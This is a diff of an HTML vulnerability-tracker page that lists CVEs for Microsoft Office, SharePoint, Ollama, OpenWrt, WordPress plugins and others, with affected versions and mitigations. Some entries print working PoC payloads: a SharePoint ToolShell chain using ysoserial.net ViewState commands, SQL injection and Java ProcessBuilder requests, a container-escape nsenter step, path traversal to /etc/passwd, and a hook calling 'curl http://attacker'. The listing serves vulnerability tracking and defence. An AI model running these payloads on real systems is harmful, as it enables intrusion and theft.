@@ -362,10 +362,10 @@ td .tag {
 <option value="8">标签</option>
 <option value="9">验真人</option>
 </select>
-<span class="stat-badge total">共 187 条</span>
-<span class="stat-badge zday">0day 15</span>
+<span class="stat-badge total">共 191 条</span>
+<span class="stat-badge zday">0day 17</span>
 <span class="stat-badge oney">1day 53</span>
-<span class="stat-badge nday">nday 119</span>
+<span class="stat-badge nday">nday 121</span>
 </div>
 <div class="table-wrap">
 <table id="vulnTable">
@@ -640,7 +640,29 @@ Nuclei: 暂无
 1. 在 Microsoft Edge 中禁用 Copilot Chat 功能（edge://settings/sidebar）
 2. 在组织内部通过组策略配置 Copilot 访问权限，限制 Copilot Chat 与内部数据的交互范围
 3. 对员工进行安全意识培训，防范 Prompt 注入钓鱼攻击
-</td><td>20260714</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">OpenWrt</span></td><td class="cell-hover" onclick="copyCell(this)">OpenWrt luci-app-samba4 远程代码执行漏洞 CVE-2026-59260</td><td><span class="tag">RCE</span></td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">/usr/sbin/smbd</td><td class="cell-hover" onclick="copyCell(this)">OpenWrt luci-app-samba4 存在权限管理不当漏洞（CWE-269，CVSS 4.0 8.7）。该组件的读 ACL 授予了 /usr/sbin/smbd 上的 file.exec 权限，允许经过身份验证的委托用户以攻击者控制的命令行参数执行 Samba 守护进程。攻击者可传递任意 Samba 全局选项（如 message command）给 root 权限的 smbd 进程，在处理 SMB 协议消息时触发命令执行。
+</td><td>20260714</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft Office 远程代码执行漏洞 CVE-2026-42831</td><td><span class="tag">RCE</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft Office for Android: 16.0.1 &lt;= version &lt; 16.0.19822.20190
+Microsoft Office LTSC for Mac 2021: 16.0.1 &lt;= version &lt; 16.109.26051019
+Microsoft Office LTSC for Mac 2024: 16.0.0 &lt;= version &lt; 16.109.26051019
+</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">Microsoft Office 存在堆缓冲区溢出漏洞（CWE-122，堆上缓冲区溢出），攻击者可通过诱导用户打开特制 Office 文件触发该漏洞，在用户上下文中执行任意代码。
+CNVD 提交时间: 2026-05-18，公开时间: 2026-06-10
+CVE 公开时间: 2026-05-12
+CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (7.8 HIGH)
+</td><td class="cell-hover" onclick="copyCell(this)">1. 立即安装微软安全更新：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-42831
+2. 建议升级 Microsoft Office for Android 至 16.0.19822.20190 及以上版本
+3. 建议升级 Microsoft Office LTSC for Mac 2021/2024 至 16.109.26051019 及以上版本
+4. 启用 Office 受保护视图（Protected View）：文件 &gt; 选项 &gt; 信任中心 &gt; 受保护视图，勾选所有选项
+5. 禁用 Office 来自 Internet 的宏运行，通过组策略配置：计算机配置 &gt; 管理模板 &gt; Microsoft Office &gt; 安全设置 &gt; 禁用所有来自 Internet 的宏
+6. 不打开来源不明的 Office 文档附件</td><td>20260714</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Ollama</span></td><td class="cell-hover" onclick="copyCell(this)">Ollama GGUF 堆越界读取漏洞 CVE-2026-7482</td><td><span class="tag">堆越界读取</span></td><td class="cell-hover" onclick="copyCell(this)">&lt; 0.17.1</td><td class="cell-hover" onclick="copyCell(this)">/api/create</td><td class="cell-hover" onclick="copyCell(this)">Ollama 0.17.1 之前版本的 GGUF 模型加载器中存在堆越界读取漏洞（CWE-125，CVSS 9.1）。/api/create 端点接受攻击者提供的 GGUF 文件，其声明的张量偏移和大小超出文件实际长度；在 fs/ggml/gguf.go 和 server/quantization.go 的 WriteTo() 量化过程中，服务器读取超出分配的堆缓冲区。泄露的内存内容可能包含环境变量、API 密钥、系统提示词及并发用户的对话数据，可通过 /api/push 端点上传播到攻击者控制的仓库进行外泄。默认绑定 127.0.0.1，但 OLLAMA_HOST=0.0.0.0 配置广泛使用，暴露面大。
+CVE: https://nvd.nist.gov/vuln/detail/CVE-2026-7482
+GitHub PoC: https://github.com/0x0OZ/CVE-2026-7482-PoC
+GitHub PoC: https://github.com/msuiche/gguf_cve2026_7482
+GitHub PoC: https://github.com/szybnev/CVE-2026-7482
+GitHub PoC: https://github.com/kaleth4/CVE-2026-7482
+最早披露: 2026-05-04</td><td class="cell-hover" onclick="copyCell(this)">升级到 Ollama 0.17.1 或更高版本（含 commit 88d57d0483cca）；临时措施：限制 /api/create 和 /api/push 端点的外部访问，仅允许受信任的内网 IP 调用；不要将 OLLAMA_HOST 设置为 0.0.0.0；在反向代理层对 /api/create 上传的 GGUF 文件大小和内容进行校验；启用身份认证；轮换已暴露的 API 密钥和凭据。</td><td>20260714</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Ollama</span></td><td class="cell-hover" onclick="copyCell(this)">Ollama for Windows 更新签名缺失漏洞 CVE-2026-42248</td><td><span class="tag">RCE</span></td><td class="cell-hover" onclick="copyCell(this)">0.12.10 ~ 0.17.5（Windows）</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">Ollama for Windows 的更新机制未对下载的更新可执行文件进行完整性或真实性验证（CWE-494，CVSS 9.8）。与其他平台不同，Windows 实现的更新验证例程无条件返回成功，下载的更新载荷在暂存或执行前未经过数字签名或信任验证。攻击者提供的可执行文件可被接受并由应用程序静默执行。与 CVE-2026-42249（更新路径遍历）配合使用时，攻击者可投递恶意载荷并自动植入持久化后门，用户在无感知的情况下被完全控制。
+CVE: https://nvd.nist.gov/vuln/detail/CVE-2026-42248
+最早披露: 2026-04-29</td><td class="cell-hover" onclick="copyCell(this)">厂商未提供官方修复版本（截至漏洞披露未回应）；临时措施：在本地网络层面拦截 Ollama 更新请求并实施更新包的签名校验；使用 Windows AppLocker 或 Software Restriction Policy 限制 ollama.exe 仅执行可信路径下的已签名二进制文件；监控 %APPDATA%\Ollama\update 目录的异常文件写入；考虑暂时禁用 Ollama 的自动更新功能；定期检查 Windows 启动目录和计划任务中是否存在异常条目。</td><td>20260714</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Ollama</span></td><td class="cell-hover" onclick="copyCell(this)">Ollama for Windows 更新路径遍历远程代码执行漏洞 CVE-2026-42249</td><td><span class="tag">RCE</span></td><td class="cell-hover" onclick="copyCell(this)">0.12.10 ~ 0.17.5（Windows）</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">Ollama for Windows 的更新机制中存在远程代码执行漏洞（CWE-22/CWE-494，CVSS 9.8）。下载更新时，应用程序使用未经校验的 HTTP 响应头中的值构造本地文件路径，并直接传入 filepath.Join，允许路径遍历序列（../）将文件写入更新暂存目录之外的位置。攻击者可写入任意可执行文件到当前用户可访问的位置（包括 Windows 启动目录）。与 CVE-2026-42248（更新签名缺失）配合使用时，攻击者可投递恶意载荷并自动执行。Ollama for Windows 执行静默自动更新，用户在无感知的情况下被植入持久化后门。
+CVE: https://nvd.nist.gov/vuln/detail/CVE-2026-42249
+最早披露: 2026-04-29</td><td class="cell-hover" onclick="copyCell(this)">厂商未提供官方修复版本（截至漏洞披露未回应）；临时措施：阻止 Ollama 更新服务器的 HTTP 响应篡改（如使用 HTTPS 并固定证书）；在 Windows 启动目录和更新暂存目录设置严格的写入权限 ACL；监控 %APPDATA%\Ollama 目录的异常文件写入；考虑暂时禁用 Ollama 的自动更新功能；使用进程监视工具检测 ollama.exe 的异常子进程创建行为。</td><td>20260714</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">OpenWrt</span></td><td class="cell-hover" onclick="copyCell(this)">OpenWrt luci-app-samba4 远程代码执行漏洞 CVE-2026-59260</td><td><span class="tag">RCE</span></td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">/usr/sbin/smbd</td><td class="cell-hover" onclick="copyCell(this)">OpenWrt luci-app-samba4 存在权限管理不当漏洞（CWE-269，CVSS 4.0 8.7）。该组件的读 ACL 授予了 /usr/sbin/smbd 上的 file.exec 权限，允许经过身份验证的委托用户以攻击者控制的命令行参数执行 Samba 守护进程。攻击者可传递任意 Samba 全局选项（如 message command）给 root 权限的 smbd 进程，在处理 SMB 协议消息时触发命令执行。
 CVE: https://nvd.nist.gov/vuln/detail/CVE-2026-59260
 GitHub Advisory: https://github.com/openwrt/luci/security/advisories/GHSA-vx64-mmp7-h36c
 最早披露: 2026-07-12</td><td class="cell-hover" onclick="copyCell(this)">升级到修复后的 OpenWrt luci-app-samba4 版本；临时措施：移除或限制 /usr/sbin/smbd 的 file.exec ACL 权限；在 luci-app-samba4 配置中禁用不必要的 Samba 全局选项传递功能；通过防火墙限制 SMB 端口（139,445）仅允许受信任的内网访问；审查并收紧 luci-app-samba4 的 ACL 配置，避免过度授权。</td><td>20260714</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">WordPress</span></td><td class="cell-hover" onclick="copyCell(this)">WordPress SALESmanago &amp; Leadoo插件 SQL注入漏洞 CVE-2026-54822</td><td><span class="tag">SQL注入</span></td><td class="cell-hover" onclick="copyCell(this)">&lt;= 3.11.2</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">WordPress SALESmanago &amp; Leadoo插件（salesmanago）3.11.2及之前版本中存在SQL注入漏洞（CWE-89），经过身份验证的订阅者（Subscriber）权限用户可通过特制参数注入恶意SQL语句，导致数据库信息泄露等危害。CVSS 8.5（HIGH）。该漏洞于2026-04-24由安全研究员endy向Patchstack报告，2026-06-17公开披露。
@@ -672,7 +694,18 @@ PoC:
 </td><td class="cell-hover" onclick="copyCell(this)">1. 对 `id`、`para*` 等输入参数进行参数化查询或严格整数校验，禁止直接拼接 SQL；
 2. WAF 拦截 `/admin/index.php` 路径下对 `id` 参数的 SQL 注入特征（如 UNION、AND、OR 后跟比较/延时函数）；
 3. 限制后台管理地址（`/admin/`）的互联网暴露，仅允许内网或 VPN 访问；
-4. 对 `app/system/include/class/user.class.php` 中 `$id` 参数使用 prepared statement 重构。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft Office 代码执行漏洞 CNVD-2026-23632</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft Office 受影响版本（版本号未公开）</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">Microsoft Office 存在远程代码执行漏洞，打开特制 Office 文件可在当前用户上下文中执行任意代码。细节待补充。</td><td class="cell-hover" onclick="copyCell(this)">安装微软最新安全更新（KB502569）；启用受保护的视图（Protected View）阻止来自 Internet 的 Office 文件执行宏；禁用 Office 宏签名校验绕过；避免打开来源不明的 Office 附件。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft SharePoint 代码执行漏洞 CNVD-2026-26519</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">SharePoint（版本号未公开）</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">Microsoft SharePoint 存在代码执行漏洞，攻击者可利用该漏洞远程执行代码。细节待补充。</td><td class="cell-hover" onclick="copyCell(this)">关注 Microsoft Security Response Center 发布的安全更新；限制 SharePoint 前端的外网暴露；对 /_vti_bin/ 等敏感路径添加额外访问控制。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Windows HTTP.sys 远程代码执行漏洞 CVE-2026-47291</td><td><span class="tag">远程代码执行（整数溢出→堆溢出→RCE）</span></td><td class="cell-hover" onclick="copyCell(this)">Windows 10 (1607/1809/21H2/22H2), Windows 11 (23H2/24H2/25H2/26H1), Windows Server 2012~2025</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">HTTP.sys 内核驱动在解析 HTTP 请求头时，16 位计数器（*(short *)(piVar16 + 400)）处理存在整数溢出漏洞（CWE-190→CWE-122）。攻击者发送包含 0xFFFF+2 个自定义 HTTP 头的特制请求，触发计数器回绕导致堆缓冲区分配不足，进而产生堆溢出，可在内核上下文（Ring 0）实现远程代码执行，获取 SYSTEM 权限。
+4. 对 `app/system/include/class/user.class.php` 中 `$id` 参数使用 prepared statement 重构。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft SharePoint 远程代码执行漏洞 CNVD-2026-26519</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">SharePoint（版本号未公开，CNVD 暂未披露详细版本范围）</td><td class="cell-hover" onclick="copyCell(this)">/_vti_bin/</td><td class="cell-hover" onclick="copyCell(this)">CNVD-2026-26519 是 Microsoft SharePoint 中的一个远程代码执行漏洞（CNVD 分类：代码问题）。攻击者可利用该漏洞在未授权情况下远程执行任意代码。
+
+CNVD（国家信息安全漏洞共享平台）于 2026年7月13日 收录此漏洞。截至披露时，CNVD 尚未公开具体的受影响版本细节及技术细节。
+
+参考链接：
+- https://www.cnvd.org.cn/flaw/show/CNVD-2026-26519
+</td><td class="cell-hover" onclick="copyCell(this)">1. 关注微软安全更新公告及 CNVD 后续披露，及时安装安全补丁
+2. 在 SharePoint 前端部署 WAF，对 /_vti_bin/ 等敏感路径添加请求检测与访问控制规则
+3. 限制 SharePoint 服务器的外网直接暴露，通过反向代理（如 Azure AD Application Proxy）隔离公网访问
+4. 启用 SharePoint 的详细日志记录（ULS 日志 + IIS 日志），监控可疑的 POST/GET 请求模式
+5. 如非必要，禁用 SharePoint 的 Web Service 端点（如 /_vti_bin/toolshell.asmx、/_vti_bin/webs.asmx 等）
+</td><td>20260713</td><td><span class="label label-0day">0day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Windows HTTP.sys 远程代码执行漏洞 CVE-2026-47291</td><td><span class="tag">远程代码执行（整数溢出→堆溢出→RCE）</span></td><td class="cell-hover" onclick="copyCell(this)">Windows 10 (1607/1809/21H2/22H2), Windows 11 (23H2/24H2/25H2/26H1), Windows Server 2012~2025</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">HTTP.sys 内核驱动在解析 HTTP 请求头时，16 位计数器（*(short *)(piVar16 + 400)）处理存在整数溢出漏洞（CWE-190→CWE-122）。攻击者发送包含 0xFFFF+2 个自定义 HTTP 头的特制请求，触发计数器回绕导致堆缓冲区分配不足，进而产生堆溢出，可在内核上下文（Ring 0）实现远程代码执行，获取 SYSTEM 权限。
 
 PoC:
 python CVE-2026-47291.py -t target
@@ -835,7 +868,7 @@ GET /&lt;path&gt;?file=../../etc/passwd</td><td class="cell-hover" onclick="copy
   image: ubuntu:latest
   options: --pid=host --cap-add=SYS_ADMIN --security-opt apparmor=unconfined
 steps:
-  - run: nsenter -t 1 -m -u -i -n -p bash</td><td class="cell-hover" onclick="copyCell(this)">关注 Gitea act_runner 官方仓库更新（https://github.com/gitea/act_runner）；临时缓解：避免在 act_runner 中运行不可信工作流，限制容器运行时的 capabilities（--cap-drop=ALL），禁止 --pid=host 和 --security-opt apparmor=unconfined 等高危选项；使用 seccomp 限制系统调用；监控容器逃逸行为。</td><td>20260628</td><td><span class="label label-0day">0day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Cursor</span></td><td class="cell-hover" onclick="copyCell(this)">Cursor IDE 两大 RCE 漏洞</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">&lt; 2.5（CVE-2026-26268）/ &lt; 3.0（CVE-2026-50548/CVE-2026-50549）</td><td class="cell-hover" onclick="copyCell(this)">/settings.local.json</td><td class="cell-hover" onclick="copyCell(this)">.claude/settings.local.json:
+  - run: nsenter -t 1 -m -u -i -n -p bash</td><td class="cell-hover" onclick="copyCell(this)">关注 Gitea act_runner 官方仓库更新（https://github.com/gitea/act_runner）；临时缓解：避免在 act_runner 中运行不可信工作流，限制容器运行时的 capabilities（--cap-drop=ALL），禁止 --pid=host 和 --security-opt apparmor=unconfined 等高危选项；使用 seccomp 限制系统调用；监控容器逃逸行为。</td><td>20260628</td><td><span class="label label-0day">0day</span></td><td>AdySec</td></tr><tr><td><span class="tag">WordPress</span></td><td class="cell-hover" onclick="copyCell(this)">WordPress Ads by WPQuads 插件敏感信息泄露漏洞 CVE-2026-54824</td><td><span class="tag">信息泄露</span></td><td class="cell-hover" onclick="copyCell(this)">&lt;= 3.0.3</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">WordPress Ads by WPQuads 插件（quick-adsense-reloaded）3.0.3 及之前版本中存在未认证敏感信息泄露漏洞（CWE-497），未经身份验证的攻击者可远程获取站点敏感配置数据，导致插件设置及用户相关敏感信息暴露。CVSS 7.5（HIGH）。2026-06-26 由 Patchstack 公开披露，研究员 HaiND 于 2026-06-16 提交。目前暂无公开 PoC 及 GitHub 仓库。</td><td class="cell-hover" onclick="copyCell(this)">立即将 Ads by WPQuads 插件升级至 3.0.4 或更高版本；如无法立即升级，可在 Web 应用防火墙中添加规则拦截对插件 REST API 端点的未授权访问；暂时禁用该插件直至完成升级；审计服务器日志中针对 wp-json/quick-adsense-reloaded 相关路由的异常访问记录。</td><td>20260626</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Cursor</span></td><td class="cell-hover" onclick="copyCell(this)">Cursor IDE 两大 RCE 漏洞</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">&lt; 2.5（CVE-2026-26268）/ &lt; 3.0（CVE-2026-50548/CVE-2026-50549）</td><td class="cell-hover" onclick="copyCell(this)">/settings.local.json</td><td class="cell-hover" onclick="copyCell(this)">.claude/settings.local.json:
 {&quot;hooks&quot;:{&quot;PostTurn&quot;:&quot;curl http://attacker&quot;}}
 
 CVE-2026-50548: working_directory=/usr/bin 覆盖 Cursorsandbox
@@ -1195,9 +1228,53 @@ GET /goanywhere/license/Unlicensed.xhtml/orange0Mint?javax.faces.ViewState=orang
 
 POST /smartbi/vision/RMIServlet HTTP/1.1 Host: target Cookie: JSESSIONID=&lt;session&gt; Content-Type: application/x-www-form-urlencoded
 
-className=ScheduleSDK&amp;methodName=testSelfDefineTask&amp;params=[&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;(new Packages.java.lang.ProcessBuilder(&quot;whoami&quot;)).start();&quot;,&quot;admin&quot;,&quot;&quot;]</td><td class="cell-hover" onclick="copyCell(this)">升级至 11.0.99471.25193</td><td>20250821</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft SharePoint ToolShell RCE CVE-2025-53770</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">SharePoint 2025年5月安全更新之前</td><td class="cell-hover" onclick="copyCell(this)">/_vti_bin/toolshell.asmx</td><td class="cell-hover" onclick="copyCell(this)">POST /_vti_bin/toolshell.asmx HTTP/1.1 Host: target Content-Type: text/xml; charset=utf-8 SOAPAction: &quot;&quot;
+className=ScheduleSDK&amp;methodName=testSelfDefineTask&amp;params=[&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;(new Packages.java.lang.ProcessBuilder(&quot;whoami&quot;)).start();&quot;,&quot;admin&quot;,&quot;&quot;]</td><td class="cell-hover" onclick="copyCell(this)">升级至 11.0.99471.25193</td><td>20250821</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">Microsoft</span></td><td class="cell-hover" onclick="copyCell(this)">Microsoft SharePoint ToolShell 反序列化远程代码执行漏洞 CVE-2025-53770</td><td><span class="tag">RCE</span></td><td class="cell-hover" onclick="copyCell(this)">SharePoint Server 2016 (&lt; 16.0.5513.1001), SharePoint Server 2019 (&lt; 16.0.10417.20037), SharePoint Server Subscription Edition (&lt; 16.0.18526.20508)</td><td class="cell-hover" onclick="copyCell(this)">/_layouts/15/ToolPane.aspx</td><td class="cell-hover" onclick="copyCell(this)">CVE-2025-53770 是 Microsoft SharePoint Server 中一个反序列化漏洞（CWE-502），评分 9.8（Critical）。该漏洞可被未授权攻击者远程利用，在无需身份认证的情况下实现代码执行。此 CVE 是此前 ToolShell 漏洞链（CVE-2025-49704 + CVE-2025-49706，2025年7月8日修复）的绕过漏洞，微软在 2025年7月19日 发布带外安全通告时首次披露。微软确认该漏洞已遭在野利用，CISA 于 2025年7月20日 将其加入 KEV 目录。
 
-&lt;soap:Envelope xmlns:soap=&quot;...&quot;&gt;&lt;soap:Body&gt;&lt;Execute xmlns=&quot;...&quot;&gt;&lt;command&gt;&lt;serialized_payload&gt;&lt;/command&gt;&lt;/Execute&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</td><td class="cell-hover" onclick="copyCell(this)">安装 2025年5月安全更新</td><td>20250720</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">汉王</span></td><td class="cell-hover" onclick="copyCell(this)">汉王 EFaceGO queryManageDeviceLogs.do SQL注入漏洞</td><td><span class="tag">SQL注入</span></td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">/manage/deviceLog/queryManageDeviceLogs.do</td><td class="cell-hover" onclick="copyCell(this)">POST /manage/deviceLog/queryManageDeviceLogs.do HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
+利用链：
+1. 攻击者构造带有特定 Referer 头 `/_layouts/SignOut.aspx` 的 POST 请求到 `/ToolPane.aspx`，绕过身份认证
+2. 通过 SOAP 接口 `/_vti_bin/toolshell.asmx` 发送序列化恶意载荷，在服务器上写入 ASPX webshell（如 `spinstall0.aspx`）
+3. webshell 读取服务器 MachineKey（ValidationKey/DecryptionKey），用于生成签名的 __VIEWSTATE 载荷
+4. 使用 ysoserial.net 生成恶意 ViewState 载荷，在任意 SharePoint 页面上实现无需认证的 RCE
+
+PoC：
+```
+# 检测是否存在 webshell
+curl -s -w &quot;%%{http_code}&quot; &quot;https://target/_layouts/15/spinstall0.aspx&quot;
+
+# 利用 ysoserial.net 生成 ViewState RCE 载荷
+ysoserial.exe -p ViewState -g TypeConfuseDelegate \
+  -c &quot;powershell -nop -c whoami&quot; \
+  --generator=&quot;&lt;VIEWSTATE_GENERATOR&gt;&quot; \
+  --validationkey=&quot;&lt;VALIDATION_KEY&gt;&quot; \
+  --validationalg=&quot;HMACSHA256&quot; \
+  --islegacy --minify
+
+# 发送恶意 ViewState 触发 RCE
+curl &quot;https://target/_layouts/15/start.aspx?__VIEWSTATE=&lt;YSOSERIAL_PAYLOAD&gt;&quot;
+```
+
+参考链接：
+- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770
+- https://github.com/kaizensecurity/CVE-2025-53770
+- https://research.eye.security/sharepoint-under-siege/
+- https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/
+- https://nvd.nist.gov/vuln/detail/CVE-2025-53770
+</td><td class="cell-hover" onclick="copyCell(this)">1. 在 SharePoint 服务器上启用 AMSI 集成（通过注册表启用 Antimalware Scan Interface）并部署 Microsoft Defender for Endpoint，以拦截恶意脚本执行
+2. 立即旋转 SharePoint ASP.NET MachineKey，防止攻击者利用已泄露的密钥伪造 ViewState：
+   ```powershell
+   Get-SPWebApplication | ForEach-Object {
+       Set-SPMachineKey -WebApplication $_.Url
+       Update-SPMachineKey -WebApplication $_.Url
+   }
+   iisreset.exe
+   ```
+3. 检查 IIS 日志中是否存在以下 IOC：
+   - POST 到 `/_layouts/15/ToolPane.aspx` 且 Referer 为 `/_layouts/SignOut.aspx`
+   - GET 请求到 `spinstall0.aspx`、`spinstall.aspx`、`spinstall1.aspx`、`xxx.aspx`、`3plx.aspx`、`debug_dev.js`、`info.js` 等文件
+   - User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0`
+4. 断开已停止支持的 SharePoint Server 版本（2013 及更早版本）的公网连接
+5. 如发现被入侵，立即隔离受影响服务器，轮换所有凭据和系统机密
+</td><td>20250719</td><td><span class="label label-0day">0day</span></td><td>AdySec</td></tr><tr><td><span class="tag">汉王</span></td><td class="cell-hover" onclick="copyCell(this)">汉王 EFaceGO queryManageDeviceLogs.do SQL注入漏洞</td><td><span class="tag">SQL注入</span></td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">/manage/deviceLog/queryManageDeviceLogs.do</td><td class="cell-hover" onclick="copyCell(this)">POST /manage/deviceLog/queryManageDeviceLogs.do HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
 
 columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT (ELT(2920=2920,1)))),8357))&amp;order=desc&amp;page=1&amp;pageSize=10</td><td class="cell-hover" onclick="copyCell(this)">联系汉王厂商获取 TVD-2026-HWN001 安全补丁；将 columnKey 参数的 MyBatis ${} 拼接改为 #{} 预编译；限制该接口仅允许内网访问；WAF 拦截 SQL 注入特征。</td><td>20250708</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">React</span></td><td class="cell-hover" onclick="copyCell(this)">React Server Components 反序列化远程代码执行漏洞</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">19.0.0</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">构造特制 HTTP 请求利用 RSC 负载中的不安全反序列化调用 Node.js 内置模块</td><td class="cell-hover" onclick="copyCell(this)">升级至 19.2.0+</td><td>20250701</td><td><span class="label label-nday">nday</span></td><td>AdySec</td></tr><tr><td><span class="tag">汉王</span></td><td class="cell-hover" onclick="copyCell(this)">汉王 e 脸通综合管理平台 uploadMapFile.do 任意文件上传漏洞</td><td><span class="tag">任意文件上传</span></td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">/manage/visitorMapConfig/uploadMapFile.do</td><td class="cell-hover" onclick="copyCell(this)">POST /manage/visitorMapConfig/uploadMapFile.do HTTP/1.1 Host: target Content-Type: multipart/form-data; boundary=----Boundary
 
